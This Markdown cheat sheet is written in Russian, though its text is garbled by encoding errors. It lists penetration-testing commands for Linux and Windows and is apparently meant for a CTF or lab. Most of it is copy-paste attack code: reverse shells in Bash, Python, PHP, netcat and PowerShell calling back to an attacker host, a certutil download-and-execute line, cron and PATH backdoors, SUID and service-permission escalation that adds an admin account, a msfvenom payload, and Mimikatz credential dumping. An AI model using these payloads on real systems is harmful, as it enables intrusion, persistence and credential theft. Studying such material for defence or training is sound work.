# üë§ –¢–∞–∫—Ç–∏–∫–∞ –ø—Ä–æ–Ω–∏–∫–Ω–æ–≤–µ–Ω–∏—è: Linux vs Windows

> –°–æ—Ö—Ä–∞–Ω–∏—Ç–µ –≤ `~/flags/linux_windows_pentest.md`

---

## üêß Linux ‚Äî –ø–æ–ª—É—á–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞

### –í–µ–∫—Ç–æ—Ä—ã –∞—Ç–∞–∫–∏

| –í–µ–∫—Ç–æ—Ä | –ö–æ–º–∞–Ω–¥–∞ | –ü—Ä–∏–º–µ—á–∞–Ω–∏–µ |
|--------|---------|------------|
| **SSH + –ø–∞—Ä–æ–ª—å** | `ssh user@10.255.44.100` | –ü–æ—Å–ª–µ –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞ —á–µ—Ä–µ–∑ hydra |
| **Web ‚Üí RCE** | `bash -i >& /dev/tcp/10.255.44.1/4444 0>&1` | Reverse shell —á–µ—Ä–µ–∑ LFI/SQLi |
| **SMB ‚Üí RCE** | `smbclient //10.255.44.100/share -U user%pass` ‚Üí –∑–∞–≥—Ä—É–∑–∫–∞ —à–µ–ª–ª–∞ | –ï—Å–ª–∏ –µ—Å—Ç—å –∑–∞–ø–∏—Å—å –≤ —à–∞—Ä—É |
| **FTP ‚Üí RCE** | `put shell.php` ‚Üí –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —á–µ—Ä–µ–∑ –≤–µ–± | –ï—Å–ª–∏ –∞–Ω–æ–Ω–∏–º–Ω–∞—è –∑–∞–ø–∏—Å—å —Ä–∞–∑—Ä–µ—à–µ–Ω–∞ |

### –ë—ã—Å—Ç—Ä—ã–π —Ä–µ–≤–µ—Ä—Å-—à–µ–ª–ª (–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –∏ –≤—Å—Ç–∞–≤–ª—è—Ç—å)
```bash
# Bash
bash -i >& /dev/tcp/10.255.44.1/4444 0>&1

# Python3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.255.44.1",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# PHP
php -r '$sock=fsockopen("10.255.44.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat (—Ç—Ä–∞–¥–∏—Ü–∏–æ–Ω–Ω—ã–π)
nc 10.255.44.1 4444 -e /bin/bash

# Netcat (–±–µ–∑ -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.255.44.1 4444 >/tmp/f
```

---

## üêß Linux ‚Äî —ç—Å–∫–∞–ª–∞—Ü–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π

### –ú–µ—Ç–æ–¥ 1: SUID –±–∏–Ω–∞—Ä–Ω–∏–∫–∏
```bash
find / -perm -4000 2>/dev/null | grep -v "proc\|sys\|dev\|run"
```

| –ë–∏–Ω–∞—Ä–Ω–∏–∫ | –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è |
|----------|--------------|
| **find** | `find . -exec /bin/sh -p \; -quit` |
| **nano** | `nano /etc/shadow` ‚Üí `^R^X` ‚Üí `reset; sh 1>&0 2>&0` |
| **vim** | `vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'` |
| **cp** | `cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash; /tmp/rootbash -p` |
| **sudo** | `sudo -l` ‚Üí –µ—Å–ª–∏ `(ALL) NOPASSWD: ALL` ‚Üí `sudo su` |

### –ú–µ—Ç–æ–¥ 2: –ù–µ–ø–∞—Ç—á—ë–Ω–Ω–æ–µ —è–¥—Ä–æ
```bash
uname -r
searchsploit linux kernel $(uname -r | cut -d'.' -f1-2)
```

### –ú–µ—Ç–æ–¥ 3: Cron jobs —Å –∑–∞–ø–∏—Å—å—é
```bash
ls -la /etc/cron.* 2>/dev/null
# –ï—Å–ª–∏ —Å–∫—Ä–∏–ø—Ç —Ä–µ–¥–∞–∫—Ç–∏—Ä—É–µ–º:
echo "bash -i >& /dev/tcp/10.255.44.1/4445 0>&1" >> /etc/cron.hourly/backup.sh
```

### –ú–µ—Ç–æ–¥ 4: PATH hijacking
```bash
# –ï—Å–ª–∏ –≤ cron –µ—Å—Ç—å –∫–æ–º–∞–Ω–¥–∞ –±–µ–∑ –ø–æ–ª–Ω–æ–≥–æ –ø—É—Ç–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, "ping")
echo 'bash -i >& /dev/tcp/10.255.44.1/4444 0>&1' > /tmp/ping
chmod +x /tmp/ping
export PATH=/tmp:$PATH
```

### –ú–µ—Ç–æ–¥ 5: Capabilities
```bash
getcap -r / 2>/dev/null
# –ï—Å–ª–∏ /usr/bin/python3 = cap_setuid+ep:
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## ü™ü Windows ‚Äî –ø–æ–ª—É—á–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞

### –í–µ–∫—Ç–æ—Ä—ã –∞—Ç–∞–∫–∏

| –í–µ–∫—Ç–æ—Ä | –ö–æ–º–∞–Ω–¥–∞ | –ü—Ä–∏–º–µ—á–∞–Ω–∏–µ |
|--------|---------|------------|
| **RDP + –ø–∞—Ä–æ–ª—å** | `xfreerdp /u:admin /p:P@ssw0rd2026 /v:10.255.44.100` | –ü–æ—Å–ª–µ –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞ |
| **SMB ‚Üí RCE** | `crackmapexec smb 10.255.44.100 -u admin -p pass -x "whoami"` | –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥ |
| **WinRM** | `evil-winrm -i 10.255.44.100 -u admin -p 'P@ssw0rd2026'` | PowerShell —à–µ–ª–ª |
| **Web ‚Üí RCE** | `certutil.exe -urlcache -f http://10.255.44.1/shell.exe c:\temp\shell.exe && c:\temp\shell.exe` | –ó–∞–≥—Ä—É–∑–∫–∞ –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ |

### –ë—ã—Å—Ç—Ä—ã–π —Ä–µ–≤–µ—Ä—Å-—à–µ–ª–ª (PowerShell)
```powershell
# PowerShell v3+
$client = New-Object System.Net.Sockets.TCPClient('10.255.44.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# –°–æ–∫—Ä–∞—â—ë–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è (amsi bypass –≤—Å—Ç—Ä–æ–µ–Ω)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.255.44.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## ü™ü Windows ‚Äî —ç—Å–∫–∞–ª–∞—Ü–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π

### –ú–µ—Ç–æ–¥ 1: AlwaysInstallElevated
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
–ï—Å–ª–∏ –æ–±–∞ = 1 ‚Üí —Å–æ–∑–¥–∞—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π MSI:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.255.44.1 LPORT=4444 -f msi -o setup.msi
```

### –ú–µ—Ç–æ–¥ 2: –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ –ø—Ä–∞–≤–∞ –Ω–∞ —Å–ª—É–∂–±—ã
```powershell
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula
```
–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:
```powershell
sc stop VulnService
sc config VulnService binPath= "net user hacker P@ssw0rd123! /add && net localgroup administrators hacker /add"
sc start VulnService
```

### –ú–µ—Ç–æ–¥ 3: Juicy Potato (Windows Server 2016/2019)
```powershell
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > c:\temp\out.txt" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673378}
```

### –ú–µ—Ç–æ–¥ 4: DLL hijacking
1. –ù–∞–π—Ç–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ –∏—â–µ—Ç –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—â—É—é DLL (—á–µ—Ä–µ–∑ Procmon)
2. –°–æ–∑–¥–∞—Ç—å —Å–≤–æ—é DLL —Å –æ–±—Ä–∞—Ç–Ω—ã–º —à–µ–ª–ª–æ–º
3. –†–∞–∑–º–µ—Å—Ç–∏—Ç—å –≤ –ø—É—Ç–∏ –ø–æ–∏—Å–∫–∞ (–æ–±—ã—á–Ω–æ `C:\Windows\System32\` –∏–ª–∏ –ø–∞–ø–∫–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è)

### –ú–µ—Ç–æ–¥ 5: Token impersonation (—Ç—Ä–µ–±—É–µ—Ç –ø—Ä–∞–≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞)
```powershell
# Mimikatz
mimikatz.exe "privilege::debug" "token::elevate" "exit"
```

---

## ü™ü Windows ‚Äî —Å–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ (PowerShell)

```powershell
# –ë–∞–∑–æ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
whoami /all
systeminfo
hostname

# –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏
net users
net localgroup administrators
net group "Domain Admins" /domain

# –°–µ—Ç–µ–≤—ã–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
netstat -ano

# –ü—Ä–æ—Ü–µ—Å—Å—ã
tasklist /SVC

# –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞
wmic startup get caption,command
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# –ü–∞—Ä–æ–ª–∏ –≤ –ø–∞–º—è—Ç–∏ (—Ç—Ä–µ–±—É–µ—Ç –∞–¥–º–∏–Ω—Å–∫–∏—Ö –ø—Ä–∞–≤)
# mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```